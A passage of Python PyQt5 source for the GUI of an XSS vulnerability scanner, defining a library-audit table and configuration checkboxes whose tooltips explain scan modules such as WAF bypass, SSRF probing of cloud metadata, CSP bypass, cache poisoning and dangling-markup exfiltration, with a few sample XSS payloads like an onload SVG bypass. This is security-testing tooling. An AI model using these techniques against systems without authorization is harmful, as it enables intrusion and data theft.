            3: 130,   # Sink (innerHTML, eval, etc.)
            4: 150,   # CVE — "CVE-2026-41238" or "—"
            5: 100,   # Original severity (was high before demote)
            6: 70,    # Line number
            7: 140,   # Param label
            8: 480,   # Payload description
        }
        for col, width in col_widths.items():
            self.lib_tbl.setColumnWidth(col, width)
        from PyQt5.QtCore import Qt as _Qt
        self.lib_tbl.setHorizontalScrollMode(QTableWidget.ScrollPerPixel)
        self.lib_tbl.setHorizontalScrollBarPolicy(_Qt.ScrollBarAsNeeded)
        self.lib_tbl.setVerticalScrollMode(QTableWidget.ScrollPerPixel)
        self.lib_tbl.setEditTriggers(QTableWidget.NoEditTriggers)
        self.lib_tbl.verticalHeader().setVisible(False)
        self.lib_tbl.setSelectionBehavior(QTableWidget.SelectRows)
        self.lib_tbl.setWordWrap(False)
        v.addWidget(self.lib_tbl); return w

    def _add_library_audit_row(self, hit_d: dict, sjs: dict):
        """Add a row to the Library Audit tab. Called when a static-js OR
        proto-pollution finding has library_audit=True flag.

        v10.9: Accepts both static_js (file/source/sink/line) and PP
        (source_file/source_pattern/gadget_kind/source_line) finding shapes.
        """
        row = self.lib_tbl.rowCount()
        self.lib_tbl.insertRow(row)
        url = hit_d.get("url", "")
        # Detect finding shape — PP findings have source_pattern key
        is_pp = "source_pattern" in sjs
        if is_pp:
            file_str = sjs.get("source_file", "") or ""
            src_pattern = sjs.get("source_pattern", "?")
            sink = sjs.get("gadget_kind") or sjs.get("kind", "PP")
            line_no = sjs.get("source_line", 0)
        else:
            file_str = sjs.get("file", "") or ""
            src_pattern = sjs.get("source", "?")
            sink = sjs.get("sink", "?")
            line_no = sjs.get("line", 0)
        file_short = file_str.rsplit("/", 1)[-1] if "/" in file_str else file_str
        original_sev = sjs.get("original_severity", "?")
        param = hit_d.get("param", "")
        payload = hit_d.get("payload", "")

        def cell(text, color="#94a3b8", tooltip=None):
            item = QTableWidgetItem(str(text))
            item.setForeground(QColor(color))
            if tooltip:
                # Qt tooltips render as rich text — escape finding-derived content
                # (url/payload) so a reflected <img src> can't phone-home on hover.
                _tt = str(tooltip).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
                item.setToolTip(_tt)
            return item

        # Severity colors for original severity column
        sev_colors = {
            "critical": "#ef4444",
            "high":     "#f59e0b",
            "medium":   "#eab308",
            "low":      "#84cc16",
            "info":     "#94a3b8",
        }
        sev_color = sev_colors.get(original_sev, "#94a3b8")

        # v10.11/v10.12/v10.13: CVE/CWE resolution priority:
        #   1. Explicit CVE from PP findings (DOMPurify CVEs)
        #   2. Library CVE feed lookup (jQuery/lodash/Bootstrap/Angular)
        #   3. CWE fallback (CWE-79 for static-js, CWE-1321 for PP)
        cve_id = sjs.get("cve", "") or ""
        if not cve_id and is_pp:
            kind = sjs.get("kind", "") or ""
            if kind.startswith("cve-"):
                cve_id = kind.upper()
        cve_tooltip = sjs.get("cve_description", "") if is_pp else ""
        cve_color = sev_colors.get(original_sev, "#94a3b8") if cve_id else "#555555"

        # v10.13: Library CVE feed — when the library file is a known vendor
        # library (jquery-1.11.3.min.js etc.), look up real CVE numbers.
        if not cve_id:
            try:
                from _library_cve_feed import audit_library_file
                lib_audit = audit_library_file(file_str)
                if lib_audit and lib_audit.get("matched_cves"):
                    cves = lib_audit["matched_cves"]
                    n = len(cves)
                    # Show first CVE + count if multiple
                    first_cve = cves[0]["cve"]
                    if n > 1:
                        cve_id = f"{first_cve} +{n - 1}"
                    else:
                        cve_id = first_cve
                    # Color by max severity of the library
                    max_sev = lib_audit.get("max_severity", "medium")
                    cve_color = sev_colors.get(max_sev, "#94a3b8")
                    # Tooltip: list all CVEs with severity
                    tip_lines = [
                        f"{lib_audit['library']} {lib_audit['version']} "
                        f"({lib_audit['version_source']})"
                    ]
                    for c in cves:
                        wild = " [CISA KEV]" if c.get("exploited_in_wild") else ""
                        tip_lines.append(
                            f"  {c['cve']} ({c['severity']}) "
                            f"— {c['vector']}{wild}"
                        )
                    cve_tooltip = "\n".join(tip_lines)
            except ImportError:
                pass  # feed module missing — fall through to CWE

        # v10.12: CWE fallback if no CVE (and no library CVE match)
        if not cve_id:
            if is_pp:
                # Generic PP chain (no DOMPurify CVE) → CWE-1321
                cve_id = "CWE-1321"
                cve_color = "#94a3b8"
                cve_tooltip = "Prototype Pollution"
            else:
                # Static-JS finding → CWE-79 (DOM XSS)
                cve_id = "CWE-79"
                cve_color = "#94a3b8"
                cve_tooltip = "Cross-site Scripting (DOM-based taint flow)"

        self.lib_tbl.setItem(row, 0, cell(url, tooltip=url))
        self.lib_tbl.setItem(row, 1, cell(file_short, tooltip=file_str))
        self.lib_tbl.setItem(row, 2, cell(src_pattern))
        self.lib_tbl.setItem(row, 3, cell(sink, "#cbd5e1"))
        self.lib_tbl.setItem(row, 4, cell(cve_id, cve_color, tooltip=cve_tooltip))
        self.lib_tbl.setItem(row, 5, cell(original_sev, sev_color))
        self.lib_tbl.setItem(row, 6, cell(line_no))
        self.lib_tbl.setItem(row, 7, cell(param))
        self.lib_tbl.setItem(row, 8, cell(payload, "#666666", tooltip=payload))

    def _t_config(self):
        sc = QScrollArea(); sc.setWidgetResizable(True); inner = QWidget(); sc.setWidget(inner)
        v = QVBoxLayout(inner); v.setContentsMargins(12,12,12,12); v.setSpacing(10)

        # v10.29: APPEARANCE — přepínač světlého/tmavého režimu (uloží se do
        # QSettings a aplikuje se živě na celou aplikaci).
        g_app = QGroupBox("Appearance"); g_appl = QGridLayout(g_app)
        g_appl.addWidget(QLabel("Theme"), 0, 0)
        self.cmb_theme = QComboBox()
        self.cmb_theme.addItem("Dark", "dark")
        self.cmb_theme.addItem("Light", "light")
        _cur = active_theme_name()
        self.cmb_theme.setCurrentIndex(self.cmb_theme.findData(_cur))
        self.cmb_theme.setToolTip(
            "Switch between dark and light UI. Saved across sessions.")
        self.cmb_theme.currentIndexChanged.connect(self._on_theme_changed)
        g_appl.addWidget(self.cmb_theme, 0, 1)
        g_appl.setColumnStretch(2, 1)
        v.addWidget(g_app)

        g1 = QGroupBox("Scan"); g1l = QGridLayout(g1)
        g1l.addWidget(QLabel("Threads"),0,0); self.sp_wrk = QSpinBox(); self.sp_wrk.setRange(1,100); self.sp_wrk.setValue(10); g1l.addWidget(self.sp_wrk,0,1)
        g1l.addWidget(QLabel("Timeout (s)"),0,2); self.sp_to = QDoubleSpinBox(); self.sp_to.setRange(1,60); self.sp_to.setValue(6); g1l.addWidget(self.sp_to,0,3)
        g1l.addWidget(QLabel("Sleep (s)"),1,0); self.sp_sl = QDoubleSpinBox(); self.sp_sl.setRange(0,10); self.sp_sl.setValue(0.02); self.sp_sl.setSingleStep(0.01); g1l.addWidget(self.sp_sl,1,1)
        g1l.addWidget(QLabel("Limit URL"),1,2); self.sp_lu = QSpinBox(); self.sp_lu.setRange(0,9999); self.sp_lu.setValue(0); self.sp_lu.setSpecialValueText("—"); g1l.addWidget(self.sp_lu,1,3)
        v.addWidget(g1)

        g2 = QGroupBox("Crawler"); g2l = QGridLayout(g2)
        g2l.addWidget(QLabel("Depth"),0,0); self.sp_dep = QSpinBox(); self.sp_dep.setRange(0,5); self.sp_dep.setValue(0); self.sp_dep.setSpecialValueText("Off"); g2l.addWidget(self.sp_dep,0,1)
        g2l.addWidget(QLabel("Max pages"),0,2); self.sp_mp = QSpinBox(); self.sp_mp.setRange(10,2000); self.sp_mp.setValue(200); g2l.addWidget(self.sp_mp,0,3)
        v.addWidget(g2)

        g3 = QGroupBox("Vectors and Functions"); g3l = QGridLayout(g3)
        # Equal stretch on all 3 columns — without this, the grid sizes
        # columns based on content (longest checkbox label), which makes
        # the Blind OOB URL field at the bottom get cut off because it
        # spans columns 1-2 but column 2 has no stretch.
        g3l.setColumnStretch(0, 1)
        g3l.setColumnStretch(1, 1)
        g3l.setColumnStretch(2, 1)
        self.ck_post  = QCheckBox("POST forms");       self.ck_json  = QCheckBox("JSON injection")
        self.ck_hdr   = QCheckBox("HTTP headers");        self.ck_fuzz  = QCheckBox("Fuzzer")
        # v10.16: path-segment + cookie-reflected XSS
        self.ck_path  = QCheckBox("Path-segment XSS")
        self.ck_path.setToolTip(
            "Injects the payload into the last URL path segment "
            "(/path/<payload>).\nCatches reflections in 404 / breadcrumb pages "
            "that query-param scanning misses\n(Express :id, Flask <name>, "
            "Spring @PathVariable). Passive GET. Default OFF.")
        self.ck_cookie = QCheckBox("Cookie-reflected XSS")
        self.ck_cookie.setToolTip(
            "Sends the payload in common cookie values (theme/lang/...) "
            "and looks\nfor unescaped reflection back into the page. "
            "Exploitation requires a cookie-set\nvector, but it's a real "
            "finding. Passive GET. Default OFF.")
        self.ck_dom   = QCheckBox("DOM dynamic");          self.ck_mark  = QCheckBox("Marker parameter");  self.ck_mark.setChecked(True)
        # v10.16: resume/checkpoint pro dlouhé skeny
        self.ck_resume = QCheckBox("Resume/checkpoint")
        self.ck_resume.setToolTip(
            "Periodically saves scan state (crawl, findings) to a file "
            "next to the report.\nIf the scan crashes or is interrupted it "
            "can be resumed — completed phases are skipped.\nAtomic writes, "
            "safe for long scans. Auto-resumes when the scan matches.")
        # v10.16: klient-ready HTML report
        self.ck_html_report = QCheckBox("HTML report")
        self.ck_html_report.setToolTip(
            "Generates a readable self-contained HTML report (severity "
            "summary, findings with remediation,\nCVE table). Payloads are "
            "HTML-escaped — the report\nopens safely in a browser. Ideal for "
            "handing to a client / attaching to a ticket.")
        # v10.16: TXT a JSON report jsou teď VOLITELNÉ (dřív se psaly vždy).
        # Default OFF — generovaly se zbytečně. Cesty se berou z polí v Settings.
        self.ck_txt_report = QCheckBox("TXT report")
        self.ck_txt_report.setToolTip(
            "Writes a plain-text report (quick human-readable summary) to the "
            "path\nin Settings → 'TXT report'. Optional; off by default.")
        self.ck_json_report = QCheckBox("JSON report")
        self.ck_json_report.setToolTip(
            "Writes a machine-readable JSON report (deduplicated findings + "
            "severity\nsummary + per-category data) to the path in Settings → "
            "'JSON report'.\nFor tooling/pipelines. Optional; off by default.")
        # ── v10.58: CLI parity — reports & evidence (paths auto-derived from
        # the JSON report path: .sarif / .poc.html / .evidence.jsonl) ──
        self.ck_sarif = QCheckBox("SARIF report")
        self.ck_sarif.setToolTip("CLI: --sarif. SARIF 2.1.0 output for GitHub "
            "Code Scanning / GitLab / Azure DevOps CI pipelines.")
        self.ck_poc = QCheckBox("PoC bundle")
        self.ck_poc.setToolTip("CLI: --poc. Self-contained bug-bounty PoC bundle "
            "(.html): a Launch link/form + curl repro + Markdown writeup per\n"
            "confirmed finding. Inert until you click Launch; browser-confirmed "
            "findings are flagged.")
        self.ck_evidence = QCheckBox("Evidence store")
        self.ck_evidence.setToolTip("CLI: --evidence-store. Persist EVERY finding "
            "(info→critical) with raw evidence to a JSONL store for ML / drift / triage.")
        # ── CLI parity — header scans (default ON; CLI disables via --no-*) ──
        self.ck_cors = QCheckBox("CORS scan"); self.ck_cors.setChecked(True)
        self.ck_cors.setToolTip("CORS misconfiguration scan (ACAO reflection + "
            "credentials). On by default; uncheck = CLI --no-cors-scan.")
        self.ck_crlf = QCheckBox("CRLF scan"); self.ck_crlf.setChecked(True)
        self.ck_crlf.setToolTip("CRLF / HTTP header injection scan. On by default; "
            "uncheck = CLI --no-crlf-scan.")
        self.ck_xssi = QCheckBox("XSSI scan"); self.ck_xssi.setChecked(True)
        self.ck_xssi.setToolTip("Cross-Site Script Inclusion scan. On by default; "
            "uncheck = CLI --no-xssi-scan.")
        # ── CLI parity — protocol / warm-up ──
        self.ck_legacy_tls = QCheckBox("Legacy TLS")
        self.ck_legacy_tls.setToolTip("CLI: --legacy-tls. Force the legacy TLS "
            "stack for old/broken servers that reject a modern handshake.")
        self.ck_warmup = QCheckBox("Warm-up origin"); self.ck_warmup.setChecked(True)
        self.ck_warmup.setToolTip("Warm up the target origin (establish cookies / "
            "baseline) before scanning. On by default; uncheck = CLI --no-warmup.")
        self.ck_ua_fresh = QCheckBox("Fresh UA (live)"); self.ck_ua_fresh.setChecked(True)
        self.ck_ua_fresh.setToolTip("Fetch a fresh, live User-Agent pool. On by "
            "default; uncheck = CLI --no-ua-fresh (offline built-in pool).")
        self.ck_ctx   = QCheckBox("Context-aware payloads"); self.ck_ctx.setChecked(True)
        self.ck_ctx.setToolTip("For candidates from the seed phase, uses targeted payloads based on the detected context (script/attr/url/html). Significantly increases hit rate.")
        self.ck_stored = QCheckBox("Stored XSS (POST + verify)")
        self.ck_stored.setToolTip("Sends a POST with a unique marker and looks for it on other pages. Detects stored XSS where the POST and detail page are different URLs.")
        self.ck_blind = QCheckBox("Blind XSS (OOB)")
        self.ck_blind.setToolTip("Out-of-Band blind XSS — injects payloads with a callback URL into all inputs. Requires --blind-oob-url.")
        self.ck_postmsg = QCheckBox("postMessage XSS")
        self.ck_postmsg.setToolTip("Looks for vulnerable postMessage listeners (addEventListener('message')) without origin validation + sink. Static + Playwright dynamic.")
        self.ck_websock = QCheckBox("WebSocket XSS")
        self.ck_websock.setToolTip("Looks for vulnerable WebSocket onmessage handlers with DOM sinks. Static + Playwright dynamic.")
        # ── v6: DOM taint analyzer (per-param canary, source/sink chains) ──
        self.ck_dom_v6 = QCheckBox("DOM v6 taint")
        self.ck_dom_v6.setToolTip(
            "Activates DOM v6 taint-aware analysis: for each crawled page it injects "
            "a unique canary into EVERY query parameter + fragment, opens it in Chromium and tracks "
            "SOURCE→SINK chains (location.*, document.*, URLSearchParams, postMessage). "
            "Finds XSS that a pure HTTP scanner misses (Twitter-style #! XSS, sudo level19). "
            "Requires playwright. Cost: ~1-2s/page."
        )
        # ── v7: Static JS analyzer (esprima AST taint flow) ──
        self.ck_static_js = QCheckBox("Static JS")
        self.ck_static_js.setToolTip(
            "Static JS analysis: parses inline <script> blocks and external .js files, "
            "tracks tainted variables through the AST, finds source→sink chains WITHOUT runtime "
            "execution. Very fast (~ms/file). Requires esprima."
        )
        # v10.51: source-map de-minification (augments Static JS)
        self.ck_sourcemap = QCheckBox("Source-map de-minify")
        self.ck_sourcemap.setToolTip(
            "Recovers ORIGINAL JavaScript from source maps before taint analysis.\n\n"
            "Production bundles ship minified (a.innerHTML=b) — the structure that\n"
            "proves a source→sink chain (variable names, functions, control flow) is\n"
            "gone, so static analysis misses findings or can't confirm them. When a\n"
            "bundle ships a .map with sourcesContent (webpack / Vite / esbuild / Rollup\n"
            "default), this fetches it, recovers the unminified source, and runs the\n"
            "same taint analyzer on the readable code.\n\n"
            "Augments Static JS (enable that too). node_modules/vendor chunks are\n"
            "skipped. Cost: one GET per .map file. Findings show origin=sourcemap.")
        # ── v5: Headless DOM verifier (definitive Chromium confirmation) ──
        self.ck_headless = QCheckBox("Headless verify")
        self.ck_headless.setToolTip(
            "After the scan, opens high-confidence findings in Chromium and definitively verifies "
            "whether they actually execute JS (captures the dialog/console with a canary token). "
            "Requires playwright. Cost: ~600ms/finding."
        )
        # ── v8: Trusted Types analyzer (CSP + policy AST audit, 2026 modern XSS) ──
        self.ck_trusted_types = QCheckBox("Trusted Types")
        self.ck_trusted_types.setToolTip(
            "Audits the CSP Trusted Types config (require-trusted-types-for, "
            "trusted-types directive) + AST audit of createPolicy() in JS. "
            "Detects: pass-through default policy (silent backdoor), "
            "wildcard policies, weak regex sanitization, report-only-only mode. "
            "Firefox 148/2026 enabled the Sanitizer API by default, Google/Stripe run TT in production. "
            "Cost: ~ms/page."
        )
        # ── v9: Stored XSS round-trip (multi-canary persistence detection) ──
        self.ck_stored_roundtrip = QCheckBox("Stored round-trip")
        self.ck_stored_roundtrip.setToolTip(
            "Multi-canary stored XSS hunt: every POST/PUT request gets a unique "
            "canary token (XSGS_xxx), after the scan it re-crawls all pages + common admin "
            "paths (/admin, /dashboard, /wp-admin) and looks for the canaries as stored XSS reflections. "
            "Severity boost to CRITICAL if a canary ends up in an admin context. Finds the classic "
            "stored XSS pattern (comment in DB → admin panel displays it → exec). "
            "Requires 'Stored XSS' (POST canaries must be sent first)."
        )
        # ── v10: Prototype Pollution → XSS chain (DOMPurify CVE feed + general PP) ──
        self.ck_proto_pollution = QCheckBox("Proto Pollution")
        self.ck_proto_pollution.setToolTip(
            "Detects prototype pollution → XSS chains. AST audit: pollution sources "
            "(lodash.merge / $.extend(true) / deepmerge / unsafe for-in), pollution "
            "gadgets (innerHTML/tagNameCheck/transport_url), vulnerable DOMPurify versions. "
            "v10.10: data-driven CVE feed (_dompurify_cve_feed.py) detects "
            "CVE-2024-47875 (mXSS via SVG), CVE-2025-26791 (template literal), "
            "CVE-2026-41238 (PP bypass). Source+gadget on the same page = HIGH chain, "
            "source+vuln-DOMPurify = CRITICAL CVE chain. Cost: ~ms/page (offline AST). "
            "Complementary with Static JS — uses the same JS bundles."
        )
        # ── v10.4: DOM Clobbering → XSS chain (Intigriti March 2026 CTF threat) ──
        self.ck_dom_clobbering = QCheckBox("DOM Clobbering")
        self.ck_dom_clobbering.setToolTip(
            "Detection of DOM Clobbering → XSS chains (2026 mainstream attack vector, "
            "Intigriti March 2026 CTF, Cure53 ongoing research). AST audit: "
            "(A) DOMPurify.sanitize() calls without FORBID_ATTR for name/id/for, "
            "(B) property reads on unowned globals (window.X.dataset/.href, etc.), "
            "(C) dangerous sinks reading from unowned identifiers (script.src = X.Y, "
            "eval(X.Y)). Sanitizer issue + clobberable sink in same page = HIGH chain. "
            "Cost: ~ms/page (offline AST). Complementary with Static JS + PP."
        )
        # ── v10.5: SSR Hydration XSS (CVE-2026-27902 Svelte 5 + general SSR) ──
        self.ck_ssr_hydration = QCheckBox("SSR Hydration")
        self.ck_ssr_hydration.setToolTip(
            "Detection of SSR Hydration XSS — server-side rendering frameworks "
            "(Svelte/SvelteKit/Next.js/Nuxt/Remix/Astro) embed JSON state + error "
            "boundary into initial HTML. Bugs in serialization → JSON breaks out of "
            "HTML comment / <script type='application/json'> context → XSS executes "
            "BEFORE client JS loads (bypasses CSP-via-meta, Trusted Types not yet "
            "active). 4 detection layers: (1) framework fingerprint + version "
            "classification (CVE-2026-27902 Svelte 5.53.0-5.53.4, CVE-2026-27125, "
            "CVE-2024-45047), (2) comment-break detection (CVE-2026-27902 pattern), "
            "(3) <script>-tag JSON breakout, (4) reflected canary in hydration JSON. "
            "Cost: ~ms/page (regex+text scan). Complementary with DC + PP."
        )
        # ── v10.6: CSP Bypass Detection Layer (2026 BIGGEST GAP) ──
        self.ck_csp_bypass = QCheckBox("CSP Bypass")
        self.ck_csp_bypass.setToolTip(
            "Detection of CSP bypass-vulnerable configuration. Tranco 50k research "
            "(2023): 94.72%% of deployed CSP policies have at least one bypass. "
            "Existing Trusted Types module checks IF a policy exists — this layer "
            "checks if it's BYPASSABLE. 6 detection layers: "
            "(A) Whitelist entries with known JSONP/redirector bypasses "
            "(*.googleapis.com hosts JSONP libs, cdnjs.cloudflare.com, etc.), "
            "(B) Unsafe-inline/unsafe-eval without nonce/hash, missing base-uri / "
            "object-src, "
            "(C) Nonce reuse detection (fetches URL twice, compares nonces — "
            "26%% sites reuse nonces per Tranco research), "
            "(D) Meta-tag CSP detection (vs HTTP header — meta is leakable via "
            "CSS attribute selectors, sirdarckcat 2008/2025 technique), "
            "(E) Wildcard host risk (*.com / *.io = essentially '*'), "
            "(F) CSS injection sinks (CVE-2026-2441 pattern — template vars "
            "in <style> blocks). Cost: ~ms/page + 1 extra fetch for nonce-reuse."
        )
        # ── v10.7: WAF Adaptive Obfuscation Pipeline ──
        self.ck_adaptive_waf = QCheckBox("Adaptive WAF Bypass")
        self.ck_adaptive_waf.setToolTip(
            "WAF-aware adaptive obfuscation. When a WAF is detected (Cloudflare, "
            "Akamai, AWS WAF, Imperva Incapsula, F5), the reflexive scan switches "
            "from generic 5-mutation chain to WAF-specific bypass templates from "
            "2024-2026 bug bounty research. 25 templates total: "
            "12 generic high-success (regex source split, tagged template literals, "
            "HTML entity polyglots, Unicode-escaped property access, MathML/SVG "
            "namespace abuse, CSS animation event handlers, etc.) + 13 WAF-specific "
            "(Cloudflare comment poison + svg newline; Akamai flagship "
            "<!--><svg+onload='top[/al/.source+/ert/.source](origin)'>; AWS srcdoc "
            "entity bypass; Imperva form action data:URL; F5 nested foreignObject). "
            "Plus encoding mutations on payload (Unicode keyword escape, hex entity, "
            "mixed-case event handlers). Pure mutation — no extra HTTP requests, "
            "no learning state. Complementary with existing context-aware fuzzer."
        )
        # ── v10.11: Open Redirect → XSS chain ──
        self.ck_open_redirect = QCheckBox("Open Redirect → XSS")
        self.ck_open_redirect.setToolTip(
            "Open Redirect → XSS chain detection. Scans URL parameters matching "
            "~40 redirect-related names (?url=, ?redirect=, ?next=, ?dest=, "
            "OAuth ?redirect_uri= etc.). For each candidate it tries a javascript:alert(1) "
            "payload and checks: HTTP 30x with Location: javascript: = CRITICAL "
            "(server reflects); HTML <meta refresh>/<a href> with javascript: = HIGH; "
            "JS code location = \"javascript:\" = HIGH. Second strategy: static "
            "AST analysis of JS bundles for sinks (location.href = X, location.replace, "
            "history.pushState) where X traces to user input. 2-step variable tracking. "
            "Often dismissed as low-severity, but the javascript: scheme = XSS. "
            "Cost: ~30 HTTP req + AST of existing bundles."
        )
        # v10.16: JSONP callback injection (high-value)
        self.ck_jsonp = QCheckBox("JSONP callback injection")
        self.ck_jsonp.setToolTip(
            "Detects JSONP endpoints vulnerable to callback injection.\n"
            "Sends ?callback=<probe> and checks whether the probe is reflected as\n"
            "a function call in a JS content-type response (application/javascript).\n"
            "That's direct XSS — an attacker puts <script src='endpoint?callback=alert(1)//'>\n"
            "on a third-party page and the code runs in the victim's context. Classic\n"
            "bug-bounty find, often overlooked (not in HTML). HTML reflection isn't reported (other phases handle it).")
        # v10.16: dangling markup injection (scriptless, CSP-resistant)
        self.ck_dangling = QCheckBox("Dangling markup injection")
        self.ck_dangling.setToolTip(
            "Scriptless HTML exfiltration — works EVEN WHEN XSS is blocked by CSP.\n"
            "Injects an unclosed tag/attribute (<xsgdm x='MARKER) and checks whether it\n"
            "reflects unescaped — then the open attribute swallows the following HTML\n"
            "(CSRF tokens, sensitive content) up to the next quote and sends it to the attacker.\n"
            "High value because it bypasses CSP. Reports only raw (unescaped) reflection.")
        # v10.16: SVG/XML content-type reflection
        self.ck_svg = QCheckBox("SVG/XML reflection XSS")
        self.ck_svg.setToolTip(
            "XSS via reflection into an image/svg+xml or application/xml response.\n"
            "When a parameter is reflected into an SVG/XML content-type, <script> executes\n"
            "on direct URL access (the SVG opens as a document). Scanners that only\n"
            "check text/html miss it. HTML content-type isn't reported (other phase).")
        # v10.51: GraphQL reflected-XSS (single-endpoint API attack surface)
        self.ck_graphql = QCheckBox("GraphQL reflected XSS")
        self.ck_graphql.setToolTip(
            "Reflected XSS in GraphQL APIs — the single-endpoint surface that crawl-\n"
            "and query-string phases walk past (the attack surface lives in the JSON\n"
            "POST body, not URL params).\n\n"
            "Discovers GraphQL endpoints (/graphql, /api/graphql, …), confirms each\n"
            "with {__typename}, then probes two high-value vectors:\n"
            "  • error-message reflection — a malformed query echoes the payload raw;\n"
            "    Apollo Sandbox / GraphiQL / custom panels render errors as HTML → XSS\n"
            "  • String-variable reflection — a canary fed through a String variable\n"
            "    comes back unescaped and is dropped into the DOM by the client\n\n"
            "Read-only: sends queries only, never mutations (cannot change server state).\n"
            "Escaped reflections are not reported (the v2 gate drops inert ones). Opt-in.")
        # ── v10.59: Markdown / rich-text injection ──
        self.ck_markdown = QCheckBox("Markdown / rich-text XSS")
        self.ck_markdown.setToolTip(
            "For apps that render user Markdown to HTML (comments, wikis, issue\n"
            "trackers, chat) via marked / markdown-it / showdown / …\n\n"
            "First CONFIRMS the endpoint actually renders Markdown (a benign\n"
            "**bold** → <strong> sentinel) — so plain reflection isn't misreported —\n"
            "then tests dangerous vectors: javascript: links/images, raw-HTML\n"
            "passthrough (<img onerror>), and link-title breakout. Only a surviving\n"
            "DANGEROUS rendered form is reported. Opt-in.")
        # ── v10.59: CSS injection / scriptless exfiltration ──
        self.ck_css = QCheckBox("CSS injection / exfil")
        self.ck_css.setToolTip(
            "Reflection into a <style> block or a style=\"…\" attribute that lets an\n"
            "attacker inject CSS — a CSP-RESISTANT vulnerability class.\n\n"
            "Confirms the marker lands in a CSS context, then that the structural\n"
            "CSS it needs (} to close a rule / ; to add a declaration / url() / @import)\n"
            "survives UNESCAPED. Enables scriptless data exfiltration (attribute-\n"
            "selector + background:url, @import). Escaped reflections are dropped. Opt-in.")
        # ── v10.69: htmx / Alpine.js attribute-injection ──
        self.ck_htmx_alpine = QCheckBox("htmx / Alpine.js XSS")
        self.ck_htmx_alpine.setToolTip(
            "For pages that load Alpine.js or htmx (common in Django / Rails /\n"
            "Laravel starter stacks). Both run JavaScript straight from HTML\n"
            "attributes — Alpine x-init, htmx hx-on::load — with NO <script> tag,\n"
            "so an injected attribute executes even under a CSP that only blocks\n"
            "inline scripts, and classic XSS scanners miss it entirely.\n\n"
            "FRAMEWORK-GATED (only runs when Alpine/htmx is actually on the page)\n"
            "and only reports when the injected attribute survives UNESCAPED — so\n"
            "false positives stay low. Opt-in.")
        # ── v10.70: config-aware DOMPurify audit ──
        self.ck_dompurify_cfg = QCheckBox("DOMPurify config audit")
        self.ck_dompurify_cfg.setToolTip(
            "DOMPurify is safe by default — the dominant real bypass is the APP\n"
            "weakening its OWN config. Statically audits each page's JS for\n"
            "dangerous DOMPurify options: ADD_TAGS (script/iframe/…), ADD_ATTR\n"
            "with on*= event handlers, ALLOW_UNKNOWN_PROTOCOLS (javascript:),\n"
            "ADD_URI_SAFE_ATTR, USE_PROFILES svg/mathMl.\n\n"
            "Works on ANY DOMPurify version (no CVE needed) and classic scanners\n"
            "never read the config object. Page-level, uses the crawl cache (no\n"
            "extra requests). The option names are DOMPurify-specific → low FP. Opt-in.")
        # ── v10.71: web cache poisoning → stored XSS ──
        self.ck_cache_poison = QCheckBox("Cache poisoning → stored XSS")
        self.ck_cache_poison.setToolTip(
            "Turns a reflected header bug into a STORED one: an unkeyed request\n"
            "header (X-Forwarded-Host, X-Forwarded-Scheme, …) reflected into a\n"
            "CACHEABLE response gets served to every visitor.\n\n"
            "Confirms the FULL chain — reflection + cacheable + PERSISTENCE (a\n"
            "clean follow-up request without the header still returns the poison).\n"
            "Persistence is the FP guard: mere header reflection is NOT reported.\n"
            "SAFE: every probe uses a unique random cache-buster, so only our own\n"
            "throwaway cache entry is ever touched — never a shared URL. Active, opt-in.")
        # ── v10.14: Parameter Wordlist Fuzzing (hidden GET param discovery) ──
        # DISABLED in this build — the active phase generated false positives
        # in nuclei-style probing (reflected canaries on error/debug pages that
        # weren't actually exploitable XSS sinks). The module is kept on disk
        # but the engine integration is removed; the checkbox stays as a
        # placeholder so users know the feature is planned, not a bug.
        # To re-enable: fix the FP source in _param_wordlist.py (likely needs
        # post-reflection exec-context check) and re-add the phase block in
        # xss_grenade.py after `find_param_urls()`.
        self.ck_param_wordlist = QCheckBox("Param Wordlist")
        self.ck_param_wordlist.setEnabled(True)
        self.ck_param_wordlist.setChecked(False)
        self.ck_param_wordlist.setToolTip(
            "Discover GET parameters not linked anywhere in HTML "
            "(PHP apps read $_GET['attachment'] directly — no link needed). "
            "This is the class of bugs nuclei's top-xss-params template "
            "catches that crawl-based scanners miss.\n\n"
            "HOW IT WORKS: batch-probes ~350 common param names against "
            "param-less / param-poor endpoints with unique canaries, detects "
            "which reflect, and feeds the live params into the normal scan "
            "phases (context-aware / fuzzer do the actual XSS testing — "
            "reflection alone is not reported as a hit).\n\n"
            "COST: adds ~9 requests per probed endpoint (batched, capped at "
            "25 endpoints). Default OFF; enabled by the Bounty preset. "
            "Recommended only on authorized targets where deep parameter "
            "discovery is in scope."
        )
        self.ck_can   = QCheckBox("Fast scan (smart payloads)");         self.ck_rota  = QCheckBox("Rotation User-Agent"); self.ck_rota.setChecked(True)
        self.ck_can.setToolTip(
            "Fast scan mode: instead of sending the full payload list, sends a "
            "small deterministic\nset of ~18 high-signal payloads (a polyglot "
            "covering many contexts at once, self-firing\nSVG/IMG, and one "
            "representative per context: script / attribute / URL / comment / "
            "style).\nDramatically fewer requests with broad coverage — ideal "
            "for a quick first pass.\nRespects your custom payload list (keeps "
            "the smart core, tops up from your set).")
        self.ck_foll  = QCheckBox("Follow redirects");     self.ck_ssl   = QCheckBox("SSL Verification")
        self.ck_verb  = QCheckBox("Verbose output")

        # ── v10.15: SSRF SCAN (opt-in s autorizačním dialogem) ──
        # SSRF je aktivní vektor: nutí cílový server dělat requesty na
        # cloud metadata (169.254.169.254), interní porty (redis/SSH/...).
        # Může spustit IDS/cloud alarmy a překročit scope. Proto stejný
        # model jako destructive — default OFF, při zaškrtnutí warning
        # dialog s potvrzením autorizace; Cancel vrátí checkbox zpět.
        self.ck_ssrf = QCheckBox("⚠ SSRF scan (active — probes internal/cloud)")
        self.ck_ssrf.setChecked(False)
        self.ck_ssrf.setStyleSheet(
            "QCheckBox { color: #ffaa33; font-weight: bold; }"
        )
        self.ck_ssrf.setToolTip(
            "⚠ ACTIVE vector — forces the TARGET server to make requests!\n\n"
            "Probes:\n"
            "  • Cloud metadata (AWS/GCP/Azure 169.254.169.254)\n"
            "  • Internal services (redis, SSH, elasticsearch, ...)\n"
            "  • IP-encoding bypass (decimal/octal/localhost)\n\n"
            "May trigger IDS / cloud security alerts and — on shared\n"
            "hosting or tightly-scoped engagements — exceed your\n"
            "authorization scope.\n\n"
            "Only for AUTHORIZED targets. Requires confirmation dialog."
        )
        self.ck_ssrf.clicked.connect(self._handle_ssrf_checkbox_click)

        # ── v10.14: DESTRUCTIVE TESTING (opt-in s explicitním warning dialogem) ──
        # Aktivuje testy které mohou zanechat persistent state na serveru:
        #   - Cache Poisoning (cachne payload pro všechny návštěvníky)
        #   - Host Header injection s aktivním password reset triggrem
